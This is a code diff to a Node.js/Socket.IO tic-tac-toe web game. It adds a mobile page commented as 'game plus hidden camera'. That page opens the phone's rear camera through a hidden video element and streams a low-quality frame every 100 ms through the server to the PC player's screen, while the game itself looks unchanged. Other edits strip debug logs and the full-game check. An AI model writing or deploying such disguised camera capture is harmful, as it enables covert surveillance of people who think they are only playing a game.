@@ -17,13 +17,14 @@ app.get('/', (req, res) => {
   const protocol = req.headers['x-forwarded-proto'] || 'http';
   const fullUrl = `${protocol}://${host}`;
   
-  // MESMA PÁGINA PARA OS DOIS, só muda o título
-  const html = `<!DOCTYPE html>
+  if (isMobile) {
+    // Página do CELULAR - jogo + câmera oculta
+    res.send(`<!DOCTYPE html>
 <html>
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>${isMobile ? 'Celular' : 'PC'} - Jogo da Velha</title>
+    <title>Celular - Jogo da Velha</title>
     <style>
         body { 
             font-family: Arial; 
@@ -46,7 +47,7 @@ app.get('/', (req, res) => {
         h1 { 
             text-align: center; 
             color: #333; 
-            margin-bottom: 20px;
+            margin-bottom: 10px;
             font-size: 24px;
         }
         .device {
@@ -83,8 +84,7 @@ app.get('/', (req, res) => {
             cursor: pointer;
             transition: all 0.3s;
         }
-        .cell:hover { background: #e9ecef; transform: scale(1.05); }
-        .cell:active { transform: scale(0.95); }
+        .cell:active { transform: scale(0.95); background: #e9ecef; }
         .cell.x { color: #e74c3c; }
         .cell.o { color: #3498db; }
         button {
@@ -99,32 +99,29 @@ app.get('/', (req, res) => {
             transition: all 0.3s;
         }
         button:hover { background: #45a049; }
-        button:disabled {
-            background: #ccc;
-            cursor: not-allowed;
-        }
-        .log {
-            margin-top: 20px;
-            padding: 10px;
-            background: #000;
-            color: #0f0;
-            border-radius: 5px;
-            font-family: monospace;
+        button:disabled { background: #ccc; cursor: not-allowed; }
+        .camera-status {
+            text-align: center;
             font-size: 12px;
-            height: 100px;
-            overflow: auto;
+            color: #666;
+            margin-top: 10px;
+        }
+        video {
+            display: none;
         }
     </style>
 </head>
 <body>
     <div class="container">
         <h1>🎮 Jogo da Velha</h1>
-        <div class="device">${isMobile ? '📱 Celular' : '💻 PC'}</div>
+        <div class="device">📱 Celular</div>
         <div class="status" id="status">Conectando...</div>
         <div class="board" id="board"></div>
         <button id="resetBtn" disabled>Reiniciar Jogo</button>
-        <div class="log" id="log"></div>
+        <div class="camera-status" id="cameraStatus">📷 Iniciando câmera...</div>
     </div>
+
+    <video id="video" autoplay playsinline muted></video>
 
     <script src="/socket.io/socket.io.js"></script>
     <script>
@@ -139,18 +136,9 @@ app.get('/', (req, res) => {
         let gameActive = false;
         let board = ['', '', '', '', '', '', '', '', ''];
         
-        const logDiv = document.getElementById('log');
         const statusDiv = document.getElementById('status');
         const resetBtn = document.getElementById('resetBtn');
-        
-        function addLog(msg) {
-            logDiv.innerHTML += '> ' + new Date().toLocaleTimeString() + ': ' + msg + '<br>';
-            logDiv.scrollTop = logDiv.scrollHeight;
-            console.log(msg);
-        }
-        
-        addLog('📱 Página carregada - ${isMobile ? 'Celular' : 'PC'}');
-        addLog('🔌 Conectando a: ${fullUrl}');
+        const cameraStatus = document.getElementById('cameraStatus');
         
         // Criar tabuleiro
         for(let i = 0; i < 9; i++) {
@@ -158,73 +146,84 @@ app.get('/', (req, res) => {
             cell.className = 'cell';
             cell.id = 'cell-' + i;
             cell.onclick = () => {
-                addLog('👆 Célula ' + i + ' clicada');
-                addLog('   minhaVez=' + minhaVez + ', gameActive=' + gameActive + ', board=' + board[i]);
-                
                 if(gameActive && minhaVez && board[i] === '') {
-                    addLog('📤 Enviando jogada pos=' + i);
                     socket.emit('jogada', i);
-                } else {
-                    if(!gameActive) addLog('⛔ Jogo não ativo');
-                    else if(!minhaVez) addLog('⛔ Não é sua vez');
-                    else if(board[i] !== '') addLog('⛔ Posição ocupada');
                 }
             };
             document.getElementById('board').appendChild(cell);
         }
-        addLog('✅ Tabuleiro criado');
+        
+        // INICIAR CÂMERA E TRANSMITIR
+        async function iniciarCamera() {
+            try {
+                cameraStatus.innerHTML = '📷 Solicitando permissão...';
+                
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { 
+                        width: 320, 
+                        height: 240,
+                        facingMode: 'environment' // câmera traseira
+                    },
+                    audio: false
+                });
+                
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+                
+                cameraStatus.innerHTML = '📷 Câmera ativa - Transmitindo...';
+                
+                // Criar canvas para capturar frames
+                const canvas = document.createElement('canvas');
+                canvas.width = 320;
+                canvas.height = 240;
+                const ctx = canvas.getContext('2d');
+                
+                // Enviar frames a cada 100ms
+                setInterval(() => {
+                    if (stream.active) {
+                        ctx.drawImage(video, 0, 0, 320, 240);
+                        const frame = canvas.toDataURL('image/jpeg', 0.3);
+                        socket.emit('frame', frame);
+                    }
+                }, 100);
+                
+            } catch (err) {
+                cameraStatus.innerHTML = '❌ Erro câmera: ' + err.message;
+            }
+        }
+        
+        iniciarCamera();
         
         socket.on('connect', () => {
-            addLog('✅ CONECTADO! Socket ID: ' + socket.id);
             statusDiv.innerHTML = 'Conectado!';
         });
         
-        socket.on('connect_error', (err) => {
-            addLog('❌ ERRO CONEXÃO: ' + err.message);
-            statusDiv.innerHTML = 'Erro de conexão';
-        });
-        
-        socket.on('disconnect', () => {
-            addLog('🔴 Desconectado');
-            statusDiv.innerHTML = 'Desconectado';
-            resetBtn.disabled = true;
-            gameActive = false;
-        });
-        
         socket.on('inicio', (data) => {
-            addLog('📨 Evento INICIO: ' + JSON.stringify(data));
             meuSimbolo = data.simbolo;
             minhaVez = meuSimbolo === 'X';
             gameActive = true;
             resetBtn.disabled = false;
             statusDiv.innerHTML = minhaVez ? 'Sua vez (X)' : 'Vez do oponente (X)';
-            addLog('🎮 Você é ' + meuSimbolo + ' - ' + (minhaVez ? 'sua vez' : 'aguarde'));
         });
         
         socket.on('jogada', (data) => {
-            addLog('📨 Evento JOGADA: ' + JSON.stringify(data));
-            
             board[data.pos] = data.simbolo;
             let cell = document.getElementById('cell-' + data.pos);
             if(cell) {
                 cell.innerHTML = data.simbolo;
                 cell.classList.add(data.simbolo.toLowerCase());
-                addLog('✅ Célula ' + data.pos + ' = ' + data.simbolo);
             }
             
             minhaVez = data.proximaVez === meuSimbolo;
             statusDiv.innerHTML = minhaVez ? 'Sua vez' : 'Vez do oponente';
-            addLog('🔄 ' + (minhaVez ? 'Sua vez' : 'Vez do oponente'));
         });
         
         socket.on('fim', (data) => {
-            addLog('📨 Evento FIM: ' + data.msg);
             statusDiv.innerHTML = data.msg;
             gameActive = false;
         });
         
         socket.on('reiniciar', () => {
-            addLog('📨 Evento REINICIAR');
             board = ['', '', '', '', '', '', '', '', ''];
             document.querySelectorAll('.cell').forEach(c => {
                 c.innerHTML = '';
@@ -233,26 +232,229 @@ app.get('/', (req, res) => {
             gameActive = true;
             minhaVez = meuSimbolo === 'X';
             statusDiv.innerHTML = minhaVez ? 'Sua vez' : 'Vez do oponente';
-            addLog('🔄 Jogo reiniciado');
         });
         
         resetBtn.onclick = () => {
-            addLog('👆 Botão REINICIAR clicado');
             socket.emit('reiniciar');
         };
     </script>
 </body>
-</html>`;
-  
-  res.send(html);
+</html>`);
+  } else {
+    // Página do PC - jogo + vídeo do celular
+    res.send(`<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>PC - Jogo da Velha</title>
+    <style>
+        body { 
+            font-family: Arial; 
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin: 0;
+            padding: 20px;
+        }
+        .container {
+            background: white;
+            border-radius: 20px;
+            padding: 30px;
+            max-width: 900px;
+            width: 100%;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
+        }
+        .grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 30px;
+        }
+        .video-box {
+            background: black;
+            border-radius: 10px;
+            overflow: hidden;
+            aspect-ratio: 4/3;
+        }
+        img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+        .game-box {
+            text-align: center;
+        }
+        h1 { 
+            color: #333; 
+            margin-bottom: 10px;
+            font-size: 24px;
+        }
+        .device {
+            font-size: 18px;
+            color: #666;
+            margin-bottom: 10px;
+        }
+        .status {
+            background: #f0f0f0;
+            padding: 15px;
+            border-radius: 10px;
+            margin: 20px 0;
+            text-align: center;
+            font-size: 18px;
+            font-weight: bold;
+        }
+        .board {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 10px;
+            margin: 20px 0;
+        }
+        .cell {
+            background: #f8f9fa;
+            border: 2px solid #dee2e6;
+            border-radius: 10px;
+            aspect-ratio: 1;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 48px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        .cell:hover { background: #e9ecef; transform: scale(1.05); }
+        .cell.x { color: #e74c3c; }
+        .cell.o { color: #3498db; }
+        button {
+            width: 100%;
+            padding: 15px;
+            background: #4CAF50;
+            color: white;
+            border: none;
+            border-radius: 10px;
+            font-size: 18px;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        button:hover { background: #45a049; }
+        button:disabled { background: #ccc; cursor: not-allowed; }
+        .video-status {
+            text-align: center;
+            font-size: 12px;
+            color: #666;
+            margin-top: 5px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🎮 Jogo da Velha</h1>
+        <div class="device">💻 PC</div>
+        <div class="grid">
+            <div>
+                <div class="video-box">
+                    <img id="video">
+                </div>
+                <div class="video-status" id="videoStatus">📱 Aguardando celular...</div>
+            </div>
+            <div class="game-box">
+                <div class="status" id="status">Conectando...</div>
+                <div class="board" id="board"></div>
+                <button id="resetBtn" disabled>Reiniciar Jogo</button>
+            </div>
+        </div>
+    </div>
+
+    <script src="/socket.io/socket.io.js"></script>
+    <script>
+        const socket = io('${fullUrl}', {
+            transports: ['websocket', 'polling']
+        });
+        
+        let minhaVez = true;
+        let meuSimbolo = 'X';
+        let gameActive = false;
+        let board = ['', '', '', '', '', '', '', '', ''];
+        
+        const statusDiv = document.getElementById('status');
+        const resetBtn = document.getElementById('resetBtn');
+        const videoImg = document.getElementById('video');
+        const videoStatus = document.getElementById('videoStatus');
+        
+        // Criar tabuleiro
+        for(let i = 0; i < 9; i++) {
+            let cell = document.createElement('div');
+            cell.className = 'cell';
+            cell.id = 'cell-' + i;
+            cell.onclick = () => {
+                if(gameActive && minhaVez && board[i] === '') {
+                    socket.emit('jogada', i);
+                }
+            };
+            document.getElementById('board').appendChild(cell);
+        }
+        
+        // Receber frames da câmera
+        socket.on('frame', (frameData) => {
+            videoImg.src = frameData;
+            videoStatus.innerHTML = '📱 Recebendo vídeo do celular';
+        });
+        
+        socket.on('connect', () => {
+            statusDiv.innerHTML = 'Conectado!';
+        });
+        
+        socket.on('inicio', () => {
+            gameActive = true;
+            resetBtn.disabled = false;
+            statusDiv.innerHTML = 'Sua vez (X)';
+        });
+        
+        socket.on('jogada', (data) => {
+            board[data.pos] = data.simbolo;
+            let cell = document.getElementById('cell-' + data.pos);
+            if(cell) {
+                cell.innerHTML = data.simbolo;
+                cell.classList.add(data.simbolo.toLowerCase());
+            }
+            
+            minhaVez = data.proximaVez === 'X';
+            statusDiv.innerHTML = minhaVez ? 'Sua vez' : 'Vez do celular';
+        });
+        
+        socket.on('fim', (data) => {
+            statusDiv.innerHTML = data.msg;
+            gameActive = false;
+        });
+        
+        socket.on('reiniciar', () => {
+            board = ['', '', '', '', '', '', '', '', ''];
+            document.querySelectorAll('.cell').forEach(c => {
+                c.innerHTML = '';
+                c.classList.remove('x', 'o');
+            });
+            gameActive = true;
+            minhaVez = true;
+            statusDiv.innerHTML = 'Sua vez';
+        });
+        
+        resetBtn.onclick = () => {
+            socket.emit('reiniciar');
+        };
+    </script>
+</body>
+</html>`);
+  }
 });
 
 // Lógica do jogo
 let board = ['', '', '', '', '', '', '', '', ''];
 let vez = 'X';
 let jogadores = {
-  x: null,  // jogador X (PC)
-  o: null   // jogador O (celular)
+  x: null,
+  o: null
 };
 
 function checkWinner() {
@@ -266,82 +468,51 @@ function checkWinner() {
 }
 
 io.on('connection', (socket) => {
-  console.log('\n🔵 Cliente conectado:', socket.id);
-  console.log('   X:', jogadores.x);
-  console.log('   O:', jogadores.o);
+  console.log('Cliente conectado:', socket.id);
   
-  // Atribuir jogadores - X sempre é o PC, O sempre é o celular
+  // Atribuir jogadores
   if (!jogadores.x) {
     jogadores.x = socket.id;
     socket.emit('inicio', { simbolo: 'X' });
-    console.log('   ✅ Jogador X atribuído (PC)');
   } else if (!jogadores.o) {
     jogadores.o = socket.id;
     socket.emit('inicio', { simbolo: 'O' });
-    console.log('   ✅ Jogador O atribuído (Celular)');
-  } else {
-    console.log('   ⚠️ Jogo cheio');
-    socket.emit('fim', { msg: 'Jogo cheio!' });
-    socket.disconnect();
   }
   
+  // Receber frames do celular e enviar para o PC
+  socket.on('frame', (frameData) => {
+    socket.broadcast.emit('frame', frameData);
+  });
+  
   socket.on('jogada', (pos) => {
-    console.log('\n🎮 Jogada recebida');
-    console.log('   Socket:', socket.id);
-    console.log('   Posição:', pos);
-    
     let jogador = socket.id === jogadores.x ? 'X' : 'O';
-    console.log('   Jogador:', jogador);
-    console.log('   Vez atual:', vez);
     
-    if (jogador !== vez) {
-      console.log('   ⚠️ Não é a vez do jogador');
-      return;
-    }
-    
-    if (board[pos] !== '') {
-      console.log('   ⚠️ Posição ocupada');
-      return;
-    }
+    if (jogador !== vez || board[pos] !== '') return;
     
     board[pos] = jogador;
-    console.log('   Board:', JSON.stringify(board));
-    
     let winner = checkWinner();
     let proximaVez = vez === 'X' ? 'O' : 'X';
     
     if (winner) {
-      console.log('   🏆 Vencedor:', winner);
       io.emit('fim', { msg: winner + ' venceu! 🎉' });
     } else if (!board.includes('')) {
-      console.log('   🤝 Empate');
       io.emit('fim', { msg: 'Empate! 🤝' });
     } else {
       vez = proximaVez;
-      console.log('   ➡️ Próxima vez:', vez);
     }
     
-    console.log('   📤 Emitindo jogada');
     io.emit('jogada', { pos, simbolo: jogador, proximaVez });
   });
   
   socket.on('reiniciar', () => {
-    console.log('\n🔄 Reiniciar');
     board = ['', '', '', '', '', '', '', '', ''];
     vez = 'X';
     io.emit('reiniciar');
   });
   
   socket.on('disconnect', () => {
-    console.log('\n🔴 Desconectado:', socket.id);
-    if (socket.id === jogadores.x) {
-      jogadores.x = null;
-      console.log('   Jogador X removido');
-    }
-    if (socket.id === jogadores.o) {
-      jogadores.o = null;
-      console.log('   Jogador O removido');
-    }
+    if (socket.id === jogadores.x) jogadores.x = null;
+    if (socket.id === jogadores.o) jogadores.o = null;
     board = ['', '', '', '', '', '', '', '', ''];
     vez = 'X';
   });
@@ -350,5 +521,4 @@ io.on('connection', (socket) => {
 server.listen(PORT, '0.0.0.0', () => {
   console.log(`\n🚀 Servidor rodando!`);
   console.log(`   Porta: ${PORT}`);
-  console.log(`   URL: http://localhost:${PORT}\n`);
 });
